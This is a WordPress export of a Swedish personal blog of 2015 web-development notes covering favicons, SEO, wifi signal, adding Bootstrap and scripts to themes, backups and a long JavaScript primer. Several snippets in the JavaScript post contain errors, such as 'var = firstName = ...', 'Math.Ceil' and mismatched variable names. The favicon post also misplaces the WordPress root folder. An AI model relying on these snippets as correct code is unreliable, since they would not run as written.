Först skapar du en ikon. Om du vill omvandla den till .ico så kan du göra det via den <a href="http://tools.dynamicdrive.com/favicon/">här hemsidan</a>. Sedan laddar du upp ikonen i root-mappen på din wordpressinstallation. Alltså under /wp-content/. Därefter lägger du till följande kod i din header.php.

[code language="html"]


&lt;link rel=&quot;icon&quot; href=&quot;&lt;?php bloginfo('siteurl'); ?&gt;/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;
&lt;link rel=&quot;shortcut icon&quot; href=&quot;&lt;?php bloginfo('siteurl'); ?&gt;/favicon.ico&quot; type=&quot;image/x-icon&quot; /&gt;

&lt;/head&gt; &lt;!--Här slutar din head --&gt;
[/code]

Sådär, då var det klart.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>346</wp:post_id>
		<wp:post_date>2015-05-29 03:41:27</wp:post_date>
		<wp:post_date_gmt>2015-05-29 03:41:27</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>lagga-till-favicon-i-wordpress</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[11118069625]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[346]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[346]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Grundläggande SEO</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/06/05/grundlaggande-seo/</link>
		<pubDate>Fri, 05 Jun 2015 19:07:44 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=352</guid>
		<description></description>
		<content:encoded><![CDATA[Search engine optimization. Här är en lista på saker att göra för att sökmotorsoptimera en sida. Listan är inte i någon specifik ordning.

<strong>XML-sitemap</strong>
Det finns redan en XML-sitemap-skapare i Yoast. 

Såhär beskriver Yoast XML-sitemaps.
A Sitemap is an XML file that lists the URLs for a site. It allows webmasters to include additional information about each URL: when it was last updated, how often it changes, and how important it is in relation to other URLs in the site. This allows search engines to crawl the site more intelligently.


]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>352</wp:post_id>
		<wp:post_date>2015-06-05 19:07:44</wp:post_date>
		<wp:post_date_gmt>2015-06-05 19:07:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>grundlaggande-seo</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="seo"><![CDATA[SEO]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[11374776294]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[352]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[352]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Boosta Wifi-signal</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/06/30/boostra-wifi-signal/</link>
		<pubDate>Tue, 30 Jun 2015 12:37:41 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=373</guid>
		<description></description>
		<content:encoded><![CDATA[Aluminium fungerar bra. Man kan öppna upp en gammal aluminium-burk och placera den runt antennen.

Fråga, vad leder signalen bäst, aluminium eller koppar?

<h2>Wifi</h2>
Trådlöst internet använder sig av radiovågor.

Såhär funkar det. En dators wireless-adapter översätter datorinformationen till radiosignaler och skickas iväg signalerna med hjälp av en antenn.

Routern tar emot signalen och översätter den och skickar den vidare via ethernet.

Här finns en <a href="http://www.sciencebuddies.org/science-fair-projects/project_ideas/CompSci_p047.shtml#background">bra beskrivning</a>.

<a href="http://www.liveport.com/wifi-signal-attenuation">Lista</a> på olika material och hur de blockerar wifi-signaler.

<img src="https://62e528761d0685343e1c-f3d1b99a743ffa4142d9d7f1978d9686.ssl.cf2.rackcdn.com/files/20642/area14mp/pvgrynkw-1361853572.jpg" alt="bra bild" />

Mer bra länkar om metallers <a href="http://forums.solidsignal.com/showthread.php/2306-What-is-a-good-material-for-an-antenna">coductivity</a>. ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>373</wp:post_id>
		<wp:post_date>2015-06-30 12:37:41</wp:post_date>
		<wp:post_date_gmt>2015-06-30 12:37:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>boostra-wifi-signal</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[12181715421]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[373]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[373]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Lägga till bootstrap i wordpress</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/08/27/lagga-till-bootstrap-i-wordpress/</link>
		<pubDate>Thu, 27 Aug 2015 18:18:23 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=450</guid>
		<description></description>
		<content:encoded><![CDATA[Detta är för att lägga till bootstrap i ett parent-theme i Wordpress.

[code lang="php"]
function my_scripts_enqueue() {
    wp_register_script( 'bootstrap-js', 'https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js', array('jquery'), NULL, true );
    wp_register_style( 'bootstrap-css', 'https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css', false, NULL, 'all' );

    wp_enqueue_script( 'bootstrap-js' );
    wp_enqueue_style( 'bootstrap-css' );
}
add_action( 'wp_enqueue_scripts', 'my_scripts_enqueue' );
[/code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>450</wp:post_id>
		<wp:post_date>2015-08-27 18:18:23</wp:post_date>
		<wp:post_date_gmt>2015-08-27 18:18:23</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>lagga-till-bootstrap-i-wordpress</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="bootstrap"><![CDATA[bootstrap]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[14159325376]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[450]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[450]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Gör ditt eget tema i Wordpress med hjälp av underscores</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/08/28/gor-ditt-eget-tema-i-wordpress-med-hjalp-av-underscores/</link>
		<pubDate>Fri, 28 Aug 2015 16:03:24 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=452</guid>
		<description></description>
		<content:encoded><![CDATA[Så du vill göra ditt eget tema. Komma ifrån alla förgjorda skitteman som är jättesvåra att anpassa. Då har du kommit rätt. Jag ska visa hur man går till väga för att skapa sitt eget tema.

1. Ladda ner DesktopServer och installera det. Det behövs för att du ska kunna utveckla ditt tema lokalt på din dator. Utan tillgång till internet, en server eller databas. DesktopServer emulerar server och databas på din lokala dator. Smidigt. 

2. Gå till underscores och ladda ner deras template. Det innehåller alla grundläggande wordpress-filer. Och alla grundläggande wordpress-hooks.

<h2>Statisk förstasida</h2>
3. Om du vill göra en statisk förstasida kan du göra det enkelt. Du kopierar bara index.php och döper om filen till static-page.php. Nu kommer static-page.php att laddas innan index.php laddas. Läs mer om detta vilka filer som laddas när i wordpress guide till template hierarchy.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>452</wp:post_id>
		<wp:post_date>2015-08-28 16:03:24</wp:post_date>
		<wp:post_date_gmt>2015-08-28 16:03:24</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>gor-ditt-eget-tema-i-wordpress-med-hjalp-av-underscores</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[14189770848]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[452]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[452]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Lägga in javascript-script i Wordpress parentheme</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/09/01/lagga-in-javascript-script-i-wordpress-parentheme/</link>
		<pubDate>Tue, 01 Sep 2015 15:11:25 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=454</guid>
		<description></description>
		<content:encoded><![CDATA[Leta efter sektionen i functions.php där script läggs till. Det kan se ut såhär.


[code lang="php"]
function resonate_scripts() {
	wp_enqueue_style( 'resonate-style', get_stylesheet_uri() );

	wp_enqueue_script( 'resonate-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );

	wp_enqueue_script( 'resonate-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

/* Här är mitt eget script so jag har lagt till. Det är baserat på jQuery det är därför som jquery finns i arrayen */
	wp_enqueue_script(
		'animations',
		get_stylesheet_directory_uri() . '/js/script.js',
		array( 'jquery' )
	);


	if ( is_singular() &amp;&amp; comments_open() &amp;&amp; get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'resonate_scripts' );

[/code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>454</wp:post_id>
		<wp:post_date>2015-09-01 15:11:25</wp:post_date>
		<wp:post_date_gmt>2015-09-01 15:11:25</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>lagga-in-javascript-script-i-wordpress-parentheme</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="javascript"><![CDATA[javascript]]></category>
		<category domain="category" nicename="jquery"><![CDATA[jQuery]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[14321360501]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[454]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[454]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>MR-kränknings-jepoardy</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/09/01/mr-kranknings-jepoardy/</link>
		<pubDate>Tue, 01 Sep 2015 15:59:29 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=456</guid>
		<description></description>
		<content:encoded><![CDATA[Det är ett jepoardy med frågor som.
"I detta land tvångssteriliserades människor som genomgick könsbyte fram till 2012."
Och om man svarar fel land så blir svaret kanske "Oohh, bra gissat, men fel. Du kanske tänkte på när Rumänien gjorde xxx?"]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>456</wp:post_id>
		<wp:post_date>2015-09-01 15:59:29</wp:post_date>
		<wp:post_date_gmt>2015-09-01 15:59:29</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>mr-kranknings-jepoardy</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="appide"><![CDATA[appidé]]></category>
		<category domain="category" nicename="javascript"><![CDATA[javascript]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[14322749771]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[456]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[456]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Backup i Wordpress</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/06/05/backup-i-wordpress/</link>
		<pubDate>Fri, 05 Jun 2015 19:14:08 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=354</guid>
		<description></description>
		<content:encoded><![CDATA[Att göra en Backup av wordpress är viktigt.

1. Gå in på wordpress och ladda ner Pluginen: Updraft Plus Backup.

2. Gå till settings. Där kan du fylla i ifall du vill automatiskt ladda upp backupen till Dropbox eller liknande. Klicka i och verifiera.

3. Gå till första sidan i pluginen igen å klicka på backup. Då skapas en backup på servern och en backup skickas till dropbox. Svårare än så är det inte.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1650</wp:post_id>
		<wp:post_date>2015-06-05 19:14:08</wp:post_date>
		<wp:post_date_gmt>2015-06-05 19:14:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>backup-i-wordpress</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="backup"><![CDATA[backup]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[11374939604]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[354]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[354]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Grundläggande JavaScript</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/06/07/grundlaggande-javascript-taggar/</link>
		<pubDate>Sun, 07 Jun 2015 20:56:08 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=356</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Inbyggda funktioner/methods</h3>
<strong>Manipulera stringar</strong>
.split() - Delar upp en sträng och lägger den i en array.
<a href="http://www.w3schools.com/jsref/jsref_splice.asp">.splice()</a> - Lägg till eller ta bort element, eller byt ut element i en array.
.reverse();
.substr(); //Tar två parametrar. Den första är var beskäringen ska börja. Den andra parametern specificerar hur många karaktärer som ska beskäras. Den andra parametern är valfri.
.substring(); //Detta är den äldre versionen av substr(); och gör samma sak. Skillnaden är den andra parametern. Substrings andra parameter är positionen efter den sista karaktären som du vill åt. Den andra parametern är valfri.
.sort();
.replace();
.indexOf(); //Används för att söka igenom en string.
.lastIndexOf(); //Samma som indexOf fast den börjar söka bakifrån. 
.charAt(); //Har en parameter, som tar indexnumret av av en viss karaktär och returerar karaktären.
[code lang="js"]
var string = &quot;Har är min string&quot;;
string.charAt(0);//returerar H
[/code]
charCodeAt(); //Samma som charAt, med skillnaden att den returerar ASCII numret på karaktären.
<a href="http://www.w3schools.com/jsref/jsref_trim_string.asp">trim();</a> //Tar bort överflödigt whitespace i början och slutet av en string.


<strong>Manipulera nummer</strong>
.toFixed(1); - Antalet decimaler ett tal ska ha.
.parseInt() - Denna funktion gör om stringar till tal. Det är viktigt att komma ihåg att den tar två argument, varav det andra argumentet definerar vilket bas talet ska vara i. För att ovandla talet till base-10 så ska man alltså lägga till 10. Exempel:
[code lang="js"]
parseInt(&quot;5&quot;, 10); 
[/code]
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/typeof">typeof</a> //För att se vad för typ av element något är. Om det är boolean, string etc.
<a href="https://msdn.microsoft.com/library/ff679973(v=vs.94).aspx">filter();</a> Filtrerar bort element från en array.

<strong>Iterative Methods - loopa utan att använda loop</strong>
Dessa methods används för att loopa igenom arrays, utan att använda en loop. Dessa kallas därför för Iterative Methods. Det finns fem Iterative Methods.
every(); Går igenom en array och avgör om ett visst condition är sant eller falskt. Till exempel.
[code lang="js"]
var numbers = [1,2,3,4,5];
function isLessThan3(value, index, array){
var returnValue = false;
if (value &lt; 3){
returnValue = true;
 }
return returnValue;
}

var trueOrFalse = numbers.every(isLessThan3);
console.log(trueOrFalse); //Returns false. 

[/code]
Eftersom the condition som finns i if-statementet är falskt. value är inte mindre än tre, eftersom värderna 4 och 5 finns där. Och de är inte mindre än tre. every() är alltså en method som avgör om varje del i en array är sann i förhållande till condition-statementet. Om du däremot skapar samma funktion, men använder det för some(); så kommer det att returera true, eftersom några av values är mindre än tre, vilket gör påståendet till sant.
some();

every() och some() är nyttiga, men du kan inte få ut någonting mer från dom än true och false. Det är därför som filter är så bra.

<strong>filter(); <strong>
Filter gör precis som every() och some() och iterate genom en array. Men varje gång som påståendet är sant så läggs det värdet till i en ny array.

map(); är en väldigt användbar funktion. Den används för att söka igenom en array och göra någonting.
[code lang="js"]
var array = [1,2,3,4,5];
//Om jag nu vill lägga till 1 på varje element inom arrayen så kan jag göra det med map, såhär:
var array = array.map(function(val){
  return val+1;
});
console.log(array); //[2,3,4,5,6]
[/code]
reduce() - lägger ihop samtliga tal i en array till ett tal.
[code lang="js"]
var array = [4,5,6,7,8];
var singleVal = 0;

var singleVal = array.reduce(function(previousVal, currentVal){
  return previousVal+currentVal; //returns 30
});
[/code]

filter() - filter filtrerar bort alla delar i en array. Vad som ska filtereras bort defineras i funktionen. Exempel:

[code lang="js"]
var array = [1,2,3,4,5,6,7,8,9,10];
array = array.filter(function(val){
  return val &lt;= 5; //filtrerar bort alla tal som över över 5
});

[/code]
concat(); används för att slå ihop två arrayer.

[code lang="js"]
var array = [1,2,3];
var concatMe = [4,5,6];
array = array.concat(concatMe);

[/code]
&nbsp;
<strong>Matematik-methods</strong>
Det finns många methods rörande matematik.
Math.PI; Get PI
Math.Ceil(2.45); Rundar upp
Math.floor(2.45); Rundar ner
Math.round(2.45); Rundar av mot närmsta heltal

&nbsp;
<h3>Object</h3>
Object i Javascript är som en dictionary i Python. Ordet Dictionary beskriver bättre vad det handlar om. Ett object består av en key och en value.
var person = {
namn: "Philip",
age: "34"
}

&nbsp;
<h3>Listor/arrays</h3>
Såhär skapar man en lista.

<code>
//Skapa en lista
var lista = ["namn", "djur", "nummer", 9, 8, 10000]</code>

//Sortera en lista
lista.sort();

//Detta behövs för att listan skall sortera nummer som nummer och inte som strängar.
list.sort(function(a,b) {
return (+a) - (+b);
});

//Vänd listan bakochfram
lista.reverse()

//Ta ut delar av en lista och gör om den till en egen lista.
sliced = list.slice(0, 2) //Den första parametern är var slicen börjar, och den andra parametern (2) är hur många objekt ur lista du vill ta ut.

//För att ta reda på om en ett visst objekt finns i en array, gör såhär.
list.indexOf("namn"); //Svaret blir positionen i listan, i detta fall 0

//Push och pop.
//För att lägga till i en array:
myArray.push(["detta laggs till langs bak i listan"]);

//För att ta bort det sista elementet i en array
myArray.pop();

//Shift och unshift
//För att ta bort det första elementet i en array
myArray.shift();
//För att lägga till det första elementet i en array
myArray.unshift();

&nbsp;
<h3>Kopiera</h3>
Gör följande för att kopiera en lista.

[code language="js"]
var lista = [&quot;Hej&quot;, &quot;apa&quot;, 6, 7];

kopiaAvLista = lista.concat();
[/code]

Nu är kopiaAvLista en kopia av listan. Helt separat.

Om du däremot gör såhär:

[code language="js"]
var lista = [&quot;Hej&quot;, &quot;apa&quot;, 6, 7];

länkTillLista = lista
[/code]

Då skapar du i princip bara en länk till listan.
<strong>console.log</strong>

Används för att printa ut något, det motsvarar pythons <strong>print</strong>

[code language="js"]
console.log(&quot;Vad som ska skrivas&quot;);
[/code]

<strong>var</strong>

var används för att skapa en variabel.

[code language="js"]
var = firstName = &quot;James&quot;;
var age = 20;
console.log(firstname, age);
[/code]

<strong>if</strong>

[code language="js"]

if ( &quot;johan&quot;.length &gt; 10 ) 
{
    console.log(&quot;Let's go down the first road!&quot;);
}
else 
{
    console.log(&quot;Du har ett kort namn&quot;);// What should we do if the condition is false? Fill in here:
    
} 

[/code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1651</wp:post_id>
		<wp:post_date>2015-06-07 20:56:08</wp:post_date>
		<wp:post_date_gmt>2015-06-07 20:56:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>grundlaggande-javascript-taggar</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="javascript"><![CDATA[javascript]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
